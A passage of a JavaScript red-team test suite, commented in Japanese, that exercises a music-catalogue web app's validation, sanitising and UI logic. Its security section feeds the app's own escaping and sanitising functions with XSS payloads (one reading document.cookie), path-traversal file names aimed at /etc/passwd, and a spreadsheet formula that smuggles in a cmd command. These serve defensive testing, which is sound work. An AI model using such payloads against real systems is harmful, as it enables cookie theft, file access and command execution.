/**
 * Red Team 破壊的テスト & セキュリティ脆弱性検証スクリプト
 * Target: MusicInfo-app
 */
const fs = require('fs');
const path = require('path');
const vm = require('vm');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const findings = [];

function recordResult(testName, passed, detail = '', severity = 'INFO') {
  totalTests++;
  if (passed) {
    passedTests++;
    console.log(`  [PASS] ${testName}`);
  } else {
    failedTests++;
    console.error(`  [FAIL] [${severity}] ${testName} - ${detail}`);
    findings.push({ testName, severity, detail });
  }
}

console.log('================================================================');
console.log('  RED TEAM ATTACK & ROBUSTNESS TEST SUITE');
console.log('  Target: MusicInfo-app (GAS + Frontend + Components)');
console.log('================================================================\n');

(async () => {
// -----------------------------------------------------------------------------
// [TEST SUITE 1] 境界値・異常値・クラッシュ注入テスト
// -----------------------------------------------------------------------------
console.log('>>> [1] 境界値・型違い・極限値注入テスト (MusicService / Config)');

const Config = require('../src/Config');
const DriveService = require('../src/DriveService');
const ItunesService = require('../src/ItunesService');
const MusicService = require('../src/MusicService');
const SheetService = require('../src/SheetService');

// モック環境のセットアップ
global.PropertiesService = {
  getScriptProperties: () => ({
    getProperties: () => ({
      SPREADSHEET_ID: 'valid-test-sheet-id',
      DRIVE_FOLDER_ID: 'valid-test-drive-id',
      SHEET_NAME: 'MusicTracks'
    })
  })
};

const mockConfig = new Config();
const mockDriveService = new DriveService(mockConfig);
const mockItunesService = new ItunesService();
let insertedRows = [];
const mockSheetService = {
  insertTracksBatch: (tracks, meta, artworkUrl) => {
    insertedRows.push({ tracks, meta, artworkUrl });
    return tracks.length;
  },
  appendSingleTrack: (trackPayload) => {
    insertedRows.push(trackPayload);
    return trackPayload;
  },
  fetchAllTracks: () => []
};

const musicService = new MusicService(mockConfig, mockSheetService, mockDriveService, mockItunesService);

// 1.1 saveSingleTrack: cdNumber / trackNumber 境界値テスト
const cdNumberPayloads = [
  { val: 0, shouldFail: true, desc: 'CD番号: 0' },
  { val: -1, shouldFail: true, desc: 'CD番号: 負数(-1)' },
  { val: -99999, shouldFail: true, desc: 'CD番号: 巨大負数(-99999)' },
  { val: NaN, shouldFail: true, desc: 'CD番号: NaN' },
  { val: 'NaN', shouldFail: true, desc: 'CD番号: 文字列 "NaN"' },
  { val: '１', shouldFail: true, desc: 'CD番号: 全角１ ("１" -> NaN)' },
  { val: 'abc', shouldFail: true, desc: 'CD番号: 英字 "abc"' },
  { val: '', shouldFail: false, desc: 'CD番号: 空文字 (デフォルト1にフォールバック)' },
  { val: null, shouldFail: false, desc: 'CD番号: null (デフォルト1にフォールバック)' },
  { val: undefined, shouldFail: false, desc: 'CD番号: undefined (デフォルト1にフォールバック)' },
  { val: 1, shouldFail: false, desc: 'CD番号: 正常値 1' },
  { val: 999999999999999, shouldFail: false, desc: 'CD番号: 巨大整数 999999999999999' },
  { val: 1.5, shouldFail: true, desc: 'CD番号: 小数点 (1.5) は整数でないため拒絶されるべき' },
  { val: Infinity, shouldFail: true, desc: 'CD番号: Infinity は拒絶されるべき' }
];

cdNumberPayloads.forEach((tc) => {
  try {
    musicService.saveSingleTrack({
      cdNumber: tc.val,
      albumArtist: 'Test Artist',
      albumName: 'Test Album',
      trackName: 'Test Track',
      trackNumber: 1
    });
    // 成功した場合
    if (tc.shouldFail) {
      recordResult(`saveSingleTrack(${tc.desc})`, false, `例外が発生せず受け入れられてしまった (値: ${tc.val})`, 'HIGH');
    } else {
      recordResult(`saveSingleTrack(${tc.desc})`, true);
    }
  } catch (err) {
    if (tc.shouldFail) {
      recordResult(`saveSingleTrack(${tc.desc})`, true);
    } else {
      recordResult(`saveSingleTrack(${tc.desc})`, false, `予期せぬ例外: ${err.message}`, 'MEDIUM');
    }
  }
});

// 1.2 saveSingleTrack: trackNumber 境界値テスト
const trackNumberPayloads = [
  { val: 0, shouldFail: true, desc: 'トラック番号: 0' },
  { val: -5, shouldFail: true, desc: 'トラック番号: 負数(-5)' },
  { val: NaN, shouldFail: true, desc: 'トラック番号: NaN' },
  { val: 2.5, shouldFail: true, desc: 'トラック番号: 小数点 (2.5) は整数でないため拒絶されるべき' },
  { val: Infinity, shouldFail: true, desc: 'トラック番号: Infinity は拒絶されるべき' }
];

trackNumberPayloads.forEach((tc) => {
  try {
    musicService.saveSingleTrack({
      cdNumber: 1,
      albumArtist: 'Test Artist',
      albumName: 'Test Album',
      trackName: 'Test Track',
      trackNumber: tc.val
    });
    if (tc.shouldFail) {
      recordResult(`saveSingleTrack(${tc.desc})`, false, `例外が発生せず受け入れられてしまった (値: ${tc.val})`, 'HIGH');
    } else {
      recordResult(`saveSingleTrack(${tc.desc})`, true);
    }
  } catch (err) {
    if (tc.shouldFail) {
      recordResult(`saveSingleTrack(${tc.desc})`, true);
    } else {
      recordResult(`saveSingleTrack(${tc.desc})`, false, `予期せぬ例外: ${err.message}`, 'MEDIUM');
    }
  }
});

// 1.3 超長大文字列 (10,000文字) & 特殊Unicode注入
console.log('\n>>> [1.3] 超長大文字列 & Unicodeサロゲートペア注入');
const megaString = 'A'.repeat(10000);
const unicodeString = '𠮷野家👨‍👩‍👧‍👦\uD83D\uDE00\u202E\u0000テスト'; // サロゲートペア、結合絵文字、RTL制御、ヌル文字

try {
  musicService.saveSingleTrack({
    cdNumber: 1,
    albumArtist: megaString,
    albumName: unicodeString,
    trackName: 'Normal Track',
    trackNumber: 1
  });
  // 要件・詳細設計で文字列長255文字制限が定義されているか
  recordResult('saveSingleTrack(10,000文字注入)', false, '255文字超過の超長大文字列がバリデーションを通過して保存された（文字長バリデーション欠落）', 'MEDIUM');
} catch (err) {
  recordResult('saveSingleTrack(10,000文字注入)', true);
}

// 1.4 saveAlbumFromItunes: tracks 配列破壊テスト
console.log('\n>>> [1.4] saveAlbumFromItunes tracks 配列破壊テスト');
const corruptTrackArrays = [
  { tracks: [], desc: 'tracks が空配列' },
  { tracks: null, desc: 'tracks が null' },
  { tracks: [null], desc: 'tracks に null が混入' },
  { tracks: [undefined], desc: 'tracks に undefined が混入' },
  { tracks: [{}], desc: 'tracks に空オブジェクトが混入' },
  { tracks: ['invalid_string'], desc: 'tracks に非オブジェクト文字列が混入' }
];

corruptTrackArrays.forEach((tc) => {
  try {
    musicService.saveAlbumFromItunes({
      albumName: 'Corrupt Album',
      albumArtist: 'Corrupt Artist',
      tracks: tc.tracks
    });
    // 空配列やnull混入で通ってしまった場合
    recordResult(`saveAlbumFromItunes(${tc.desc})`, false, '不正なトラック配列が例外なく処理された', 'HIGH');
  } catch (err) {
    // 適切なエラーコードか、未処理TypeErrorか
    if (err instanceof TypeError) {
      recordResult(`saveAlbumFromItunes(${tc.desc})`, false, `未処理 TypeError が発生: ${err.message}`, 'HIGH');
    } else {
      recordResult(`saveAlbumFromItunes(${tc.desc})`, true, `適切にエラー送出: ${err.message}`);
    }
  }
});

// 1.5 非文字列キーワード注入: searchItunesAlbums(12345) / searchItunesAlbums({})
console.log('\n>>> [1.5] searchItunesAlbums 非文字列注入');
const nonStringKeywords = [
  { val: 12345, desc: '数値をキーワードに渡す' },
  { val: {}, desc: 'オブジェクトをキーワードに渡す' },
  { val: true, desc: '真偽値をキーワードに渡す' }
];

nonStringKeywords.forEach((tc) => {
  try {
    musicService.searchItunesAlbums(tc.val);
    recordResult(`searchItunesAlbums(${tc.desc})`, true);
  } catch (err) {
    if (err instanceof TypeError && err.message.includes('trim is not a function')) {
      recordResult(`searchItunesAlbums(${tc.desc})`, false, `未処理 TypeError (keyword.trim is not a function): ${err.message}`, 'HIGH');
    } else {
      recordResult(`searchItunesAlbums(${tc.desc})`, true);
    }
  }
});


// -----------------------------------------------------------------------------
// [TEST SUITE 2] セキュリティ & エクスプロイト検証
// -----------------------------------------------------------------------------
console.log('\n>>> [2] セキュリティ & エクスプロイト検証 (XSS, Drive, Config)');

// 2.1 XSS サニタイズ完全性検証
const utilsContent = fs.readFileSync(path.join(__dirname, '../src/ScriptsUtils.html'), 'utf8');
const scriptTagRegex = /<script>([\s\S]*?)<\/script>/;
const utilsJs = (utilsContent.match(scriptTagRegex) || [])[1];
const utilsSandbox = {};
vm.createContext(utilsSandbox);
vm.runInContext(utilsJs + '\nthis.Utils = Utils;', utilsSandbox);
const Utils = utilsSandbox.Utils;

const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '"><script>alert(document.cookie)</script>',
  '\' onfocus=\'alert(1)',
  '<svg/onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>'
];

let xssEscapedAll = true;
xssPayloads.forEach((payload) => {
  const escaped = Utils.escapeHtml(payload);
  if (escaped.includes('<') || escaped.includes('>') || escaped.includes('"') || escaped.includes("'")) {
    xssEscapedAll = false;
    recordResult(`Utils.escapeHtml("${payload}")`, false, `危険な記号が残留: ${escaped}`, 'CRITICAL');
  }
});
if (xssEscapedAll) {
  recordResult('Utils.escapeHtml 全XSS記号エスケープ検証', true);
}

// 2.2 DriveService ファイル名サニタイズ & ディレクトリトラバーサル検証
console.log('\n>>> [2.2] DriveService ファイル名サニタイズ検証');
const driveSanitizeTests = [
  { input: '../../../../etc/passwd', expectedNotContain: ['/', '\\', '..'], desc: 'パストラバーサル相対パス' },
  { input: '..\\..\\windows\\system32\\calc.exe', expectedNotContain: ['\\', '/'], desc: 'Windows UNC パス' },
  { input: 'CON', desc: 'Windows予約デバイス名 CON' },
  { input: 'PRN', desc: 'Windows予約デバイス名 PRN' },
  { input: 'AUX', desc: 'Windows予約デバイス名 AUX' },
  { input: 'NUL', desc: 'Windows予約デバイス名 NUL' },
  { input: 'Album: "Best" / Hits * 2026? <New> | Special', expectedNotContain: [':', '"', '/', '*', '?', '<', '>', '|'], desc: '禁止記号全種' },
  { input: '///', desc: 'スラッシュのみ' },
  { input: '   ', desc: '空白のみ' },
  { input: 'A'.repeat(500), desc: '500文字の超長大アルバム名' },
  { input: 'Album\0Name\x01\x1F', desc: 'ヌル文字およびASCII制御文字' }
];

driveSanitizeTests.forEach((tc) => {
  const sanitized = mockDriveService.sanitizeFileName(tc.input);
  let safe = true;
  let reason = '';

  if (!sanitized || sanitized.length === 0) {
    safe = false;
    reason = 'サニタイズ結果が空文字';
  } else if (sanitized.length > 60) {
    safe = false;
    reason = `文字長が60文字を超過 (${sanitized.length}文字)`;
  } else if (tc.expectedNotContain) {
    for (const char of tc.expectedNotContain) {
      if (sanitized.includes(char)) {
        safe = false;
        reason = `禁止文字 [${char}] が残留: ${sanitized}`;
        break;
      }
    }
  }

  // ヌル文字検査
  if (sanitized.includes('\0')) {
    safe = false;
    reason = `ヌル文字 (\\0) がファイル名に残留: ${sanitized}`;
  }

  if (safe) {
    recordResult(`DriveService.sanitizeFileName(${tc.desc})`, true);
  } else {
    recordResult(`DriveService.sanitizeFileName(${tc.desc})`, false, reason, 'MEDIUM');
  }
});

// 2.3 プロパティ未設定時の安全なフォールバック
console.log('\n>>> [2.3] プロパティ未設定時の安全な例外・フォールバック検証');
global.PropertiesService = {
  getScriptProperties: () => ({
    getProperties: () => ({})
  })
};

const brokenConfig = new Config();
try {
  brokenConfig.getSpreadsheetId();
  recordResult('Config.getSpreadsheetId (未設定時)', false, '未設定なのに例外が発生しなかった', 'HIGH');
} catch (err) {
  if (err.code === 'CONFIG_SPREADSHEET_ID_MISSING') {
    recordResult('Config.getSpreadsheetId (未設定時)', true);
  } else {
    recordResult('Config.getSpreadsheetId (未設定時)', false, `コード不一致: ${err.code}`, 'MEDIUM');
  }
}

try {
  brokenConfig.getDriveFolderId();
  recordResult('Config.getDriveFolderId (未設定時)', false, '未設定なのに例外が発生しなかった', 'HIGH');
} catch (err) {
  if (err.code === 'CONFIG_DRIVE_FOLDER_ID_MISSING') {
    recordResult('Config.getDriveFolderId (未設定時)', true);
  } else {
    recordResult('Config.getDriveFolderId (未設定時)', false, `コード不一致: ${err.code}`, 'MEDIUM');
  }
}

// 2.4 スプレッドシート式インジェクション (CSV/Formula Injection)
console.log('\n>>> [2.4] スプレッドシート式インジェクション検証');
const formulaPayloads = [
  '=SUM(1,2)',
  '=cmd|\' /C calc\'!A0',
  '-5+2',
  '+10-3',
  '@SUM(B1:B10)'
];

formulaPayloads.forEach((formula) => {
  insertedRows = [];
  try {
    musicService.saveSingleTrack({
      cdNumber: 1,
      albumArtist: formula,
      albumName: 'Formula Test',
      trackName: formula,
      trackNumber: 1
    });
    const saved = insertedRows[insertedRows.length - 1];
    // 式インジェクション（=で始まる文字列）の無害化（先頭シングルクォート等）が行われているか
    if (saved && String(saved.albumArtist).startsWith('=')) {
      recordResult(`CSV/式インジェクション (${formula})`, false, '先頭の "=" がエスケープされずにスプレッドシートへ直接書き込まれる仕様（式実行の可能性あり）', 'LOW');
    } else {
      recordResult(`CSV/式インジェクション (${formula})`, true);
    }
  } catch (err) {
    recordResult(`CSV/式インジェクション (${formula})`, true);
  }
});


// -----------------------------------------------------------------------------
// [TEST SUITE 3] 状態破壊 & レースコンディション検証
// -----------------------------------------------------------------------------
console.log('\n>>> [3] 状態破壊 & レースコンディション検証 (Store / Search)');

const storeContent = fs.readFileSync(path.join(__dirname, '../src/ScriptsState.html'), 'utf8');
const storeJs = (storeContent.match(scriptTagRegex) || [])[1];
const storeSandbox = {};
vm.createContext(storeSandbox);
vm.runInContext(storeJs + '\nthis.Store = Store;', storeSandbox);
const Store = storeSandbox.Store;

const store = new Store();

// 3.1 破壊的トラックオブジェクト混入時の buildCatalog 耐性
const corruptedTracks = [
  null,
  undefined,
  {},
  { cdNumber: 'invalid', trackNumber: 'none' },
  { albumArtist: null, albumName: undefined, cdNumber: 1, trackNumber: 1, trackName: null }
];

try {
  store.setTracks(corruptedTracks);
  recordResult('Store.setTracks(null/undefined/空オブジェクト混入)', true);
} catch (err) {
  recordResult('Store.setTracks(null/undefined/空オブジェクト混入)', false, `クラッシュ発生: ${err.message}`, 'HIGH');
}

// 3.2 数値の曲名 (Prince - 1999等) での横断検索クラッシュ耐性
const numericTracks = [
  {
    cdNumber: 1,
    albumArtist: 'Prince',
    albumName: '1999',
    trackArtist: 'Prince',
    trackNumber: 1,
    trackName: 1999 // 数値型
  },
  {
    cdNumber: 1,
    albumArtist: 'Blur',
    albumName: 'Blur',
    trackArtist: 'Blur',
    trackNumber: 2,
    trackName: 2 // 数値型
  }
];

try {
  store.setTracks(numericTracks);
  const searchRes = store.searchAcrossAllTracks('1999');
  recordResult('Store.searchAcrossAllTracks (曲名が数値型の場合)', true);
} catch (err) {
  recordResult('Store.searchAcrossAllTracks (曲名が数値型の場合)', false, `toLowerCase クラッシュ: ${err.message}`, 'HIGH');
}

// 3.3 二重送信防止フラグ (isSaving) の検証
console.log('\n>>> [3.3] 二重送信防止 (Double Click / Rapid Click) 検証');
const appContent = fs.readFileSync(path.join(__dirname, '../src/ScriptsApp.html'), 'utf8');

const hasIsSavingCheckInBatch = appContent.includes('if (this.store.state.isSaving) return;') &&
                                appContent.includes('this.store.state.isSaving = true;');
recordResult('submitItunesBatch 二重送信ガード (isSaving)', hasIsSavingCheckInBatch, 'isSaving による排他制御が存在する');

const hasIsSavingCheckInManual = appContent.includes('submitManualTrack') &&
                                 appContent.includes('if (this.store.state.isSaving) return;') &&
                                 appContent.includes('this.store.state.isSaving = true;');
recordResult('submitManualTrack 二重送信ガード (isSaving)', hasIsSavingCheckInManual, 'isSaving による排他制御が存在する');

const hasManualButtonDisable = appContent.includes('btn-submit-manual-track') &&
                               appContent.includes('disabled = true');
recordResult('submitManualTrack 送信ボタンの物理無効化 (disabled = true)', hasManualButtonDisable, '手動登録送信時にボタンが disabled されない（連打の視覚的抑止不足）', 'LOW');

// 手動登録パフォーマンス改善: 登録毎ではなくモーダル閉時に読み直す設計の検証
const submitManualFuncMatch = appContent.match(/async\s+submitManualTrack\s*\(\)\s*\{([\s\S]*?)\n\s*async\s+openImageModal/);
const submitManualBody = submitManualFuncMatch ? submitManualFuncMatch[1] : '';
const doesNotReloadInSubmit = !submitManualBody.includes('loadInitialData()');
recordResult('submitManualTrack 登録時の全データ再読み込み抑止 (パフォーマンス検証)', doesNotReloadInSubmit, '手動登録ボタン押下時に loadInitialData() が実行されており、連続登録時のパフォーマンスが低下する恐れがあります', 'MEDIUM');

const closeManualFuncMatch = appContent.match(/async\s+closeManualModal\s*\([^)]*\)\s*\{([\s\S]*?)\n\s*\/\*\*/);
const closeManualBody = closeManualFuncMatch ? closeManualFuncMatch[1] : '';
const reloadsOnCloseIfSaved = closeManualBody.includes('this.hasManualSaved') && closeManualBody.includes('loadInitialData()');
recordResult('closeManualModal モーダル閉時の全データ遅延再読み込み検証', reloadsOnCloseIfSaved, '手動登録完了後にモーダルを閉じる際、最新データへの同期 (loadInitialData) が実行されていません', 'MEDIUM');

// 3.4 手動登録フロー動的実行シミュレーション検証 (BUG-001 / BUG-002 / ISSUE-003 / ISSUE-004)
console.log('\n>>> [3.4] 手動登録フロー動的実行シミュレーション検証 (App.submitManualTrack & closeManualModal)');

function createMockElement(id, initialProps = {}) {
  const classes = new Set(initialProps.classes || []);
  return {
    id,
    value: initialProps.value || '',
    checked: initialProps.checked || false,
    disabled: initialProps.disabled || false,
    classList: {
      add: (c) => classes.add(c),
      remove: (c) => classes.delete(c),
      toggle: (c, force) => {
        if (force === undefined) {
          if (classes.has(c)) classes.delete(c); else classes.add(c);
        } else if (force) {
          classes.add(c);
        } else {
          classes.delete(c);
        }
      },
      contains: (c) => classes.has(c)
    },
    focus: () => {},
    checkValidity: () => true,
    reportValidity: () => true,
    addEventListener: () => {},
    ...initialProps
  };
}

const mockElements = {
  'modal-manual': createMockElement('modal-manual'),
  'form-manual-track': createMockElement('form-manual-track'),
  'manual-cd-number': createMockElement('manual-cd-number', { value: '1' }),
  'manual-album-artist': createMockElement('manual-album-artist', { value: 'Official髭男dism' }),
  'manual-album-name': createMockElement('manual-album-name', { value: 'Editorial' }),
  'manual-track-artist': createMockElement('manual-track-artist', { value: 'Official髭男dism' }),
  'manual-track-number': createMockElement('manual-track-number', { value: '1' }),
  'manual-track-name': createMockElement('manual-track-name', { value: 'Cry Baby' }),
  'manual-release-date': createMockElement('manual-release-date', { value: '2021-08-18' }),
  'manual-artwork-url': createMockElement('manual-artwork-url', { value: 'https://example.com/art.jpg' }),
  'manual-continuous-check': createMockElement('manual-continuous-check', { checked: false }),
  'manual-submit-btn-text': createMockElement('manual-submit-btn-text'),
  'manual-submit-spinner': createMockElement('manual-submit-spinner', { classes: ['hidden'] }),
  'btn-submit-manual-track': createMockElement('btn-submit-manual-track'),
  'btn-close-manual-modal': createMockElement('btn-close-manual-modal'),
  'btn-cancel-manual-modal': createMockElement('btn-cancel-manual-modal')
};

const mockDoc = {
  getElementById: (id) => mockElements[id] || null,
  addEventListener: () => {}
};

const appJs = (appContent.match(scriptTagRegex) || [])[1];
const appSandbox = {
  window: { innerWidth: 1024, addEventListener: () => {} },
  document: mockDoc,
  Store: function() {
    this.state = {
      isSaving: false,
      selectedArtist: null,
      selectedAlbum: null,
      allTracks: [],
      artistList: ['Official髭男dism']
    };
    this.setTracks = () => {};
    this.getAlbumsForSelectedArtist = () => [];
  },
  ApiClient: function() {
    this.saveTrackSingle = async () => ({ success: true });
    this.getAllData = async () => ({ tracks: [] });
  },
  Utils: {
    showToast: () => {},
    toggleGlobalLoading: () => {},
    debounce: (fn) => fn,
    escapeHtml: (s) => s,
    formatDate: (d) => d
  },
  console: console
};
vm.createContext(appSandbox);
vm.runInContext(appJs, appSandbox);
const AppClass = appSandbox.App || appSandbox.window.App;

// 3.4.1 単発登録 (continuous = false) 動的検証 (BUG-001, BUG-002, ISSUE-003)
const appInstance1 = new AppClass();
mockElements['modal-manual'].classList.remove('hidden');
mockElements['manual-continuous-check'].checked = false;
let disabledDuringSave = false;
let loadInitialCalled1 = false;
let selectedArtistBeforeLoad = null;
let selectedAlbumBeforeLoad = null;

appInstance1.api.saveTrackSingle = async () => {
  if (mockElements['btn-submit-manual-track'].disabled &&
      mockElements['btn-close-manual-modal'].disabled &&
      mockElements['btn-cancel-manual-modal'].disabled &&
      appInstance1.store.state.isSaving) {
    disabledDuringSave = true;
  }
  return { success: true };
};

appInstance1.loadInitialData = async () => {
  loadInitialCalled1 = true;
  selectedArtistBeforeLoad = appInstance1.store.state.selectedArtist;
  selectedAlbumBeforeLoad = appInstance1.store.state.selectedAlbum;
};

await appInstance1.submitManualTrack();

recordResult(
  '動的検証: [BUG-001] 単発登録完了時にモーダルが閉じ(hidden付与)、loadInitialDataが実行されること',
  mockElements['modal-manual'].classList.contains('hidden') && loadInitialCalled1,
  '単発登録完了後にモーダルが閉じないか、loadInitialDataが呼び出されていません'
);

recordResult(
  '動的検証: [BUG-002] 保存通信中にボタンが無効化され、完了後に活性復元されること',
  disabledDuringSave &&
  !mockElements['btn-submit-manual-track'].disabled &&
  !mockElements['btn-close-manual-modal'].disabled &&
  !mockElements['btn-cancel-manual-modal'].disabled &&
  !appInstance1.store.state.isSaving,
  '保存中のボタン無効化または完了後の復元が正常に行われていません'
);

recordResult(
  '動的検証: [ISSUE-003] loadInitialData前に選択アーティスト・アルバムが設定され二重描画を防ぐこと',
  selectedArtistBeforeLoad === 'Official髭男dism' && selectedAlbumBeforeLoad === 'Editorial',
  'loadInitialData 前に対象アーティスト・アルバムが Store にセットされていません'
);

// 3.4.2 保存通信中の排他ガード検証
appInstance1.store.state.isSaving = true;
mockElements['modal-manual'].classList.remove('hidden');
let guardedLoadInitialCalled = false;
appInstance1.loadInitialData = async () => { guardedLoadInitialCalled = true; };

await appInstance1.closeManualModal(false);

recordResult(
  '動的検証: isSaving=true 中の外部 closeManualModal 呼び出しが排他ガードされること',
  !mockElements['modal-manual'].classList.contains('hidden') && !guardedLoadInitialCalled,
  '保存中であるにもかかわらずモーダルが閉じられたか、loadInitialData が呼び出されました'
);
appInstance1.store.state.isSaving = false;

// 3.4.3 連続登録 (continuous = true) 動的検証
const appInstance2 = new AppClass();
mockElements['modal-manual'].classList.remove('hidden');
mockElements['manual-continuous-check'].checked = true;
mockElements['manual-track-number'].value = '1';
mockElements['manual-track-name'].value = 'Pretender';
let continuousLoadCalled = false;
appInstance2.loadInitialData = async () => { continuousLoadCalled = true; };

await appInstance2.submitManualTrack();

recordResult(
  '動的検証: 連続登録時にモーダルが開いたままであり、loadInitialDataが抑止され、曲番号が+1されること',
  !mockElements['modal-manual'].classList.contains('hidden') &&
  !continuousLoadCalled &&
  Number(mockElements['manual-track-number'].value) === 2 &&
  mockElements['manual-track-name'].value === '' &&
  appInstance2.hasManualSaved === true,
  '連続登録時の挙動（モーダル維持・リロード抑止・番号インクリメント）が不正です'
);

// その後モーダルを手動で閉じる
await appInstance2.closeManualModal();
recordResult(
  '動的検証: 連続登録後にモーダルを閉じた際、モーダルが閉じ、遅延loadInitialDataが実行されること',
  mockElements['modal-manual'].classList.contains('hidden') &&
  continuousLoadCalled &&
  appInstance2.hasManualSaved === false,
  '連続登録後のモーダルクローズ時にデータ同期が実行されませんでした'
);


// -----------------------------------------------------------------------------
// [TEST SUITE 4] スマホ UI / 狭小画面 (320px) & アクセシビリティ検証
// -----------------------------------------------------------------------------
console.log('\n>>> [4] スマホUI / 320px 破壊的検証 & 44px タッチターゲット');

const navbarContent = fs.readFileSync(path.join(__dirname, '../src/Navbar.html'), 'utf8');
const albumListContent = fs.readFileSync(path.join(__dirname, '../src/AlbumList.html'), 'utf8');
const trackDetailContent = fs.readFileSync(path.join(__dirname, '../src/TrackDetail.html'), 'utf8');
const manualModalContent = fs.readFileSync(path.join(__dirname, '../src/ManualModal.html'), 'utf8');

// 4.1 タッチターゲット 44px 検証
// btn-back-to-artists
const backToArtistsHas44px = albumListContent.includes('btn-back-to-artists') &&
                             (albumListContent.includes('min-h-[44px]') || albumListContent.includes('h-11'));
recordResult('btn-back-to-artists 44pxタッチターゲット確保', backToArtistsHas44px, '戻るボタンのパディングが py-1 で約24pxしかなく 44px 未満', 'MEDIUM');

// btn-back-to-albums
const backToAlbumsHas44px = trackDetailContent.includes('btn-back-to-albums') &&
                            (trackDetailContent.includes('min-h-[44px]') || trackDetailContent.includes('h-11'));
recordResult('btn-back-to-albums 44pxタッチターゲット確保', backToAlbumsHas44px, '戻るボタンのパディングが py-1 で約24pxしかなく 44px 未満', 'MEDIUM');

// 4.2 手動フォーム Enter キーによる誤送信／リロード防止
const hasFormPreventDefault = appContent.includes('form-manual-track') &&
                              (appContent.includes('preventDefault') || appContent.includes('submit'));
recordResult('手動登録フォーム Enter キー押下時のデフォルト送信抑止', hasFormPreventDefault, 'form submit イベントの preventDefault が未登録のため Enter 押下で予期せぬリロードまたは不正遷移の恐れあり', 'MEDIUM');

// -----------------------------------------------------------------------------
// [TEST SUITE 5] アルバム編集機能（updateAlbum / updateAlbumBatch / 編集モーダル制御）破壊的テスト
// -----------------------------------------------------------------------------
console.log('\n>>> [5] アルバム編集機能 破壊的テスト & レッドチーム攻撃検証');

const editMusicService = new MusicService(mockConfig, {
  updateAlbumBatch: (targetKey, newAlbumMeta, newTracks) => ({
    updatedRowCount: newTracks.length,
    totalRowCount: newTracks.length,
    previousRowCount: 1,
    albumName: newAlbumMeta.albumName,
    albumArtist: newAlbumMeta.albumArtist
  })
}, mockDriveService, mockItunesService);

// 5.1 updateAlbum ペイロード破壊・極限値・型汚染攻撃
console.log('\n>>> [5.1] MusicService.updateAlbum ペイロード破壊・極限値・型汚染攻撃');

const baseValidEditPayload = () => ({
  targetKey: {
    originalAlbumArtist: 'Valid Artist',
    originalAlbumName: 'Valid Album'
  },
  album: {
    albumArtist: 'Updated Artist',
    albumName: 'Updated Album',
    releaseDate: '2026-10-17',
    artworkUrl: 'https://example.com/art.jpg'
  },
  tracks: [
    { cdNumber: 1, trackNumber: 1, trackName: 'Track 1', trackArtist: 'Updated Artist' },
    { cdNumber: 1, trackNumber: 2, trackName: 'Track 2', trackArtist: 'Updated Artist' }
  ]
});

const invalidEditPayloads = [
  // ペイロード構造自体の破壊
  { payload: null, desc: 'payload: null' },
  { payload: undefined, desc: 'payload: undefined' },
  { payload: 'string_payload', desc: 'payload: 文字列型' },
  { payload: 12345, desc: 'payload: 数値型' },
  { payload: [], desc: 'payload: 配列型' },
  { payload: {}, desc: 'payload: 空オブジェクト' },

  // targetKey 破壊
  { payload: { ...baseValidEditPayload(), targetKey: null }, desc: 'targetKey: null' },
  { payload: { ...baseValidEditPayload(), targetKey: undefined }, desc: 'targetKey: undefined' },
  { payload: { ...baseValidEditPayload(), targetKey: {} }, desc: 'targetKey: 空オブジェクト' },
  { payload: { ...baseValidEditPayload(), targetKey: { originalAlbumArtist: '', originalAlbumName: 'Album' } }, desc: 'targetKey.originalAlbumArtist: 空文字' },
  { payload: { ...baseValidEditPayload(), targetKey: { originalAlbumArtist: '   ', originalAlbumName: 'Album' } }, desc: 'targetKey.originalAlbumArtist: 空白のみ' },
  { payload: { ...baseValidEditPayload(), targetKey: { originalAlbumArtist: 'Artist', originalAlbumName: '' } }, desc: 'targetKey.originalAlbumName: 空文字' },
  { payload: { ...baseValidEditPayload(), targetKey: { originalAlbumArtist: 'Artist', originalAlbumName: '   ' } }, desc: 'targetKey.originalAlbumName: 空白のみ' },

  // album メタデータ破壊
  { payload: { ...baseValidEditPayload(), album: null }, desc: 'album: null' },
  { payload: { ...baseValidEditPayload(), album: undefined }, desc: 'album: undefined' },
  { payload: { ...baseValidEditPayload(), album: {} }, desc: 'album: 空オブジェクト' },
  { payload: { ...baseValidEditPayload(), album: { albumArtist: 'Artist', albumName: '' } }, desc: 'album.albumName: 空文字' },
  { payload: { ...baseValidEditPayload(), album: { albumArtist: 'Artist', albumName: '   ' } }, desc: 'album.albumName: 空白のみ' },
  { payload: { ...baseValidEditPayload(), album: { albumArtist: '', albumName: 'Album' } }, desc: 'album.albumArtist: 空文字' },
  { payload: { ...baseValidEditPayload(), album: { albumArtist: '   ', albumName: 'Album' } }, desc: 'album.albumArtist: 空白のみ' },
  { payload: { ...baseValidEditPayload(), album: { albumArtist: 'Artist', albumName: 'A'.repeat(256) } }, desc: 'album.albumName: 256文字 (制限超過)' },
  { payload: { ...baseValidEditPayload(), album: { albumArtist: 'A'.repeat(256), albumName: 'Album' } }, desc: 'album.albumArtist: 256文字 (制限超過)' },
  { payload: { ...baseValidEditPayload(), album: { albumArtist: 'Artist', albumName: 'A'.repeat(10000) } }, desc: 'album.albumName: 10,000文字 (超長大文字列攻撃)' },

  // tracks 配列破壊（全曲削除抑止含む）
  { payload: { ...baseValidEditPayload(), tracks: null }, desc: 'tracks: null' },
  { payload: { ...baseValidEditPayload(), tracks: undefined }, desc: 'tracks: undefined' },
  { payload: { ...baseValidEditPayload(), tracks: 'invalid_tracks' }, desc: 'tracks: 非配列文字列' },
  { payload: { ...baseValidEditPayload(), tracks: {} }, desc: 'tracks: 非配列オブジェクト' },
  { payload: { ...baseValidEditPayload(), tracks: [] }, desc: 'tracks: 空配列 (全曲削除攻撃・最低1曲必須)' },
  { payload: { ...baseValidEditPayload(), tracks: [null] }, desc: 'tracks: [null] 混入' },
  { payload: { ...baseValidEditPayload(), tracks: [undefined] }, desc: 'tracks: [undefined] 混入' },
  { payload: { ...baseValidEditPayload(), tracks: ['not an object'] }, desc: 'tracks: プリミティブ文字列混入' },
  { payload: { ...baseValidEditPayload(), tracks: [12345] }, desc: 'tracks: プリミティブ数値混入' },
  { payload: { ...baseValidEditPayload(), tracks: [{}] }, desc: 'tracks: 空オブジェクト混入' },

  // tracks 内個別項目バリデーション (trackName)
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 1, trackName: '' }] }, desc: 'tracks[0].trackName: 空文字' },
